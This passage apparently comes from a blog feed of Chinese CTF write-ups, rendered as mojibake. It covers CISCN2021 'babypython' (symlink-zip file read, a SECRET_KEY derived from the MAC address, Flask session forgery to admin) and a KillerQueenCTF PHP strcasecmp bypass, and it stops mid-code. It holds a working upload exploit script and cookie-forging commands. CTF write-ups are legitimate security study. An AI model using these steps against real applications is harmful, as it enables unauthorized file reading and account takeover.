&lt;h3 id="pdoé¢„å¤„ç†">PDOé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDOé¢„å¤„ç†å±žäºŽæ˜¯é€šé˜²äº†ï¼Œèƒ½æœ‰æ•ˆåœ°åº”å¯¹sqliç‰¹åˆ«æ˜¯å †å æ³¨å…¥ï¼Œ208è¡Œçš„è®¾ç½®é¡¹æ„ä¸ºç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›babypython">[CISCN2021 æ€»å†³èµ›]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>sshè¿žä¸ŠåŽçœ‹ä¸‹ç›®å½•ç»“æž„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>æŸ¥çœ‹/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11è¡Œè¿™ä¸æ˜¯å…¸ä¸­å…¸äº†ï¼Ÿè¯»macåœ°å€å°±æ‰“é€šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æŽ¥æŠŠSECRET_KEYæ”¹ä¸ºä¸€ä¸ªåˆé•¿åˆä¹±çš„éšæœºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥ä½¿ç”¨&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guidç”Ÿæˆå™¨&lt;/a>æ¥ç”Ÿæˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>â€”â€”â€”â€”ç¢Žç¢Žå¿µï¼šè¿™é‡Œä¿®å¤çš„æ—¶å€™å¯èƒ½çœ‹è„¸ï¼Ÿæˆ‘åœ¨å‡ å¤©å‰è¯•çš„æ—¶å€™ç”¨çš„ä¸€æ¨¡ä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æ€Žä¹ˆéƒ½ä¸èƒ½è¿‡checkï¼Œä»Šå¤©è¯•äº†ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨å†™wpçš„æ—¶å€™å†å¤ç›˜å°±åˆä¸å¯ä»¥äº†â€¦â€¦emmm å¯èƒ½è¿˜æ˜¯å“ªé‡Œçš„ç»†èŠ‚å‡ºäº†é”™ä½†æ˜¯æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Ÿç»™æˆ‘æ•´ä¸ä¼šäº†å±žäºŽæ˜¯&lt;/p>
&lt;/blockquote>
&lt;h3 id="å…³äºŽæœ¬é¢˜">å…³äºŽæœ¬é¢˜&lt;/h3>
&lt;p>æ˜¯ä¸ªåŽŸé¢˜ï¼Œè¿˜æ˜¯ä¸ªæœ‰äº†åŒ…æµ†çš„åŽŸé¢˜ï¼Œå‚è§-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>ï¼Œåšè¿‡çš„å°±çŸ¥é“è¿™ä»–å¦ˆçœŸçš„å°±ä¸€æ¨¡ä¸€æ ·hhhhhhhh&lt;/p>
&lt;p>è€ƒç‚¹åœ¨äºŽlinuxè½¯é“¾æŽ¥+uuid+flask-sessionä¼ªé€ ï¼ŒåŽè€…è¿˜ç»å¸¸å•ç‹¬å‡ºé¢˜ï¼Œæ¯”å¦‚ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åŽä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œéƒ½å¿«çƒ¤çƒ‚äº†&lt;/p>
&lt;h3 id="è€ƒç‚¹ä¸€--uuidsecret_key">è€ƒç‚¹ä¸€ Â· uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEYé€šè¿‡uuid+ä¼ªéšæœºæ•°çš„æ–¹å¼ç”Ÿæˆï¼Œè¿™ä¸ªè€ƒç‚¹å¯ä»¥å‚è€ƒ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åŽä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œå…¶ä¸­app.pyæ˜¯è¿™æ ·å†™çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>ä¼šä»¥48ä½äºŒè¿›åˆ¶é•¿åº¦çš„æ­£æ•´æ•°å½¢å¼è¿”å›žmacåœ°å€ï¼Œlinuxä¸‹macåœ°å€çš„ä½ç½®åœ¨&lt;code>/sys/class/net/eth0/address&lt;/code>ï¼Œè¯»å‡ºmacåœ°å€åŽæˆ‘ä»¬ä¹Ÿæ¥ç”Ÿæˆä¸€æ³¢ä¼ªéšæœºæ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>ä¹‹åŽé€šè¿‡flask-session-cookie-managerä¸€æŠŠæ¢­å³å¯ä¼ªé€ sessionå€¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>â€”â€”â€”â€”å¦å¤–ï¼Œé€šå¸¸è®¿é—®ä¸å­˜åœ¨ç›®å½•æ—¶SECRET_KEYä¼šå‡ºçŽ°åœ¨è¯·æ±‚å¤´ä¸­&lt;/p>
&lt;h3 id="è€ƒç‚¹äºŒ--linuxè½¯é“¾æŽ¥æ–‡ä»¶è¯»å–zipåŽ‹ç¼©åŒ…">è€ƒç‚¹äºŒ Â· linuxè½¯é“¾æŽ¥æ–‡ä»¶è¯»å–&amp;amp;zipåŽ‹ç¼©åŒ…&lt;/h3>
&lt;p>ln -sæ˜¯linuxä¸­çš„è½¯é“¾æŽ¥å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œå¯¹åº”æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„è½¯é“¾æŽ¥æ¥è¯»æ–‡ä»¶ï¼›å½“ä¸çŸ¥é“flaskå·¥ä½œç›®å½•å¯ä»¥ä½¿ç”¨&lt;code>/proc/self/cwd&lt;/code>æ¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ç›®å½•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…é€šè¿‡&lt;code>/proc/self/environ&lt;/code>æ–‡ä»¶é‡ŒåŒ…å«è¿›ç¨‹çš„çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»Žä¸­èŽ·å–flaskçš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ¶ä½œè½¯é“¾æŽ¥ï¼ˆå…³äºŽ/procçš„æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/procç›®å½•çš„å¦™ç”¨&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCEåˆ©ç”¨æ€»ç»“&lt;/a>ï¼Œé¢˜-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[ç½‘é¼Žæ¯ 2020 ç™½è™Žç»„]PicDown&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œå¯¹äºŽç›®å½•å†…æ–‡ä»¶çš„åˆ—ä¸¾ä¹Ÿæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå‚è§-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Webé¢˜ extract0r Writeup&lt;/a>&lt;/p>
&lt;p>ç”šè‡³ä¹Ÿå¯ä»¥å†™å…¥shellï¼Œå‚è§-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[æ·±è‚²æ¯ 2021]Zipzip&lt;/a>&lt;/p>
&lt;p>åˆ¶ä½œå¥½çš„è½¯é“¾æŽ¥é€šè¿‡zipæ‰“åŒ…&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ›´å¤šé¢˜ç›®ä¸­çš„åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•&lt;/a>&lt;/p>
&lt;p>å…³äºŽè¿™ä¸ªæ¼æ´žçš„å®žé™…åº”ç”¨å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ž (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´ž&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 ç”Ÿæˆè½¯é“¾æŽ¥&amp;amp;zip&amp;amp;è‡ªåŠ¨ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 æ ¹æ®macåœ°å€ç”Ÿæˆä¼ªéšæœºæ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>ç¿»å›žå¤´çœ‹æºç ï¼Œå¥½å®¶ä¼™è¿™é‡Œæœ‰å†…é¬¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>è¿”å›žçš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œè€Œæ˜¯secret.secretä¸­çš„å†…å®¹no flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67è¡Œè¿™é‡Œä¼šå¯¹unzipæ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œåªè¦å«æœ‰flagå­—æ ·å°±ä¼šé‡å®šå‘è‡³/?error=1&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œæˆ‘æ„Ÿè§‰åŽŸé¢˜åº”è¯¥secret.pyä¸­çš„&lt;code>secret=&lt;/code>ç›´æŽ¥å°±èƒ½è¯»å‡ºæ¥flagï¼Œæƒ³äº†å¥½ä¹…ï¼Œå†ç»•ä¸€å±‚flag.txtçš„è¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ä»€ä¹ˆbypassçš„æ–¹æ³•äº†ï¼Œæˆ‘å€¾å‘äºŽæ˜¯å¸ƒç½®çŽ¯å¢ƒçš„æ—¶å€™æ²¡æœ‰è®¾ç½®è¿™ä¸€ç‚¹ï¼ˆ&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›easy_python">***[CISCN2021 æ€»å†³èµ›]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>ä¸çŸ¥é“æ˜¯æˆ‘çš„ç½‘ç»œé—®é¢˜è¿˜æ˜¯ä»€ä¹ˆæœªçŸ¥çš„bugâ€¦â€¦checkä¹‹åŽå°±ä¼šå®•æœºï¼Œåªèƒ½é‡æ–°ä¸‹å‘é¶æœº&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›ezj4va">***[CISCN2021 æ€»å†³èµ›]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>è¿˜ä¸ä¼šjava å…ˆç©ºç€TAT&lt;/p></description></item><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</link><pubDate>Sat, 30 Oct 2021 16:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
&lt;blockquote>
&lt;p>I really don&amp;rsquo;t think we&amp;rsquo;re compatible (&lt;a href="http://143.198.184.186:7000/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;shhhh you don&amp;#39;t get to see this locally&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strcasecmp&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That&amp;#39;s the wrong password!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬çš„è€æœ‹å‹&lt;code>strcasecmp()&lt;/code>å‡½æ•°ï¼Œå®ƒå’Œ&lt;code>strcmp()&lt;/code>å‡½æ•°ä¸€æ ·ç”¨äºŽæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒºåˆ«æ˜¯åŽè€…ä¼šåŒºåˆ†å¤§å°å†™ï¼›ç»•è¿‡æ–¹å¼æ˜¯ä¼ å…¥æ•°ç»„ï¼Œè¿™æ ·ä¼šä½¿ä¸¤ä¸ªå‡½æ•°æ— æ³•å¤„ç†è€Œè¿”å›žnull&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030104447923.png" alt="image-20211030104447923">&lt;/p>
&lt;p>&lt;code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}&lt;/code>&lt;/p>
&lt;h2 id="webphat-pottomed-girls">web/PHat Pottomed Girls&lt;/h2>
&lt;blockquote>
&lt;p>Now it&amp;rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (&lt;a href="http://143.198.184.186:7001/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$characters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
